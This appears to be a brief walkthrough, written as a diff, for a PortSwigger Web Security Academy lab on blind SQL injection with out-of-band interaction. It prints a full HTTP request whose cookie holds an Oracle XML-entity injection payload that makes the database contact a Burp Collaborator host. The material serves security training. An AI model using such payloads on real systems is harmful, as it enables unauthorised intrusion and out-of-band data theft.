@@ -1,0 +1,19 @@
+Blind SQL injection with out-of-band interaction
+
+We're using collaborator this time, so fire it up, and intercept the request for the main page. 
+Add your collaborator ID to the payload so that it looks similar to this:
+
+GET / HTTP/1.1
+Host: ace21f061f0d4c418091ef20003100ca.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
+Connection: close
+Cookie: TrackingId=x'+UNION+SELECT+extractvalue(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//d1fizrqwo5nt71is77bnhq6njep4dt.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--. ; session=zcOaOdcN92LG4GCspCjRBSqcvzqLJVAG
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+
+Forward the request and check your collaborator. You just got a few requests, proving the existance of the SQL injection.
